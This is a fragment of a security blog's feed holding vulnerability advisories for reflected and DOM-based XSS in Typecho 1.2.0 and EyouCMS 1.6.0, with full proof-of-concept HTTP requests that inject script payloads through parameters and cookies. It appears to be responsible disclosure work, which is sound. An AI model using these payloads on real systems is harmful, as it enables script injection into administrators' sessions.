</span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in backend /admin/index.php with arbitrarily supplied URL parameter.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend DOM-Based XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T11:48:55.000Z</published>
    <updated>2023-02-21T11:48:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend DOM-Based Cross-Site Scripting in backend /admin/write-post.php when creating new or editing existed post.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45542)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/</id>
    <published>2023-02-15T13:33:17.000Z</published>
    <updated>2023-02-15T13:33:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file management editor with reflected-XSS in the GET value <code>filename</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=edit&amp;filename=li|&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--sts_media.htm&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201612233-8e16dccb-774b-433b-b6f2-306216deb043.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/33">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45542">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend loing.php when editing file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45537)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/</id>
    <published>2023-02-15T13:18:35.000Z</published>
    <updated>2023-02-15T13:18:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Background article publish with reflected-XSS in the cookie <code>ENV_LIST_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D=cn; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201614458-17b781bf-148a-419c-9b92-7e9f0527d78d.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/34">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45537">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45538)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/</id>
    <published>2023-02-15T13:12:41.000Z</published>
    <updated>2023-02-15T13:12:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article publish with reflected-XSS in the cookie <code>ENV_GOBACK_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201615717-be81fb04-1140-4e59-b83b-16244cab3fc8.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/35">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45538">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45541)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/</id>
    <published>2023-02-15T13:03:58.000Z</published>
    <updated>2023-02-15T13:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article attribute type changing with reflected-XSS in the POST value <code>value</code> when the value contains non-integer char, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Index&amp;a=changeTableVal&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=ArchivesFlag&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex; ENV_IS_UPHTML=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"></span><br><span class="line"><span class="language-sas">value=<span class="title function_">%BA0</span>&lt;script&gt;alert(1)&lt;/script&gt;<span class="variable">&amp;field</span>=status<span class="variable">&amp;id_value</span>=1<span class="variable">&amp;id_name</span>=id<span class="variable">&amp;table</span>=archives_flag</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201617314-9974739a-12ef-4da5-9bbc-dc252941a50c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/36">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45541">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend  loing.php when changing article attribute type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45540)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/</id>
    <published>2023-02-15T12:47:27.000Z</published>
    <updated>2023-02-15T12:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article type adding with reflected-XSS in the post value <code>name</code> when the value contains malformed UTF-8 chars, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 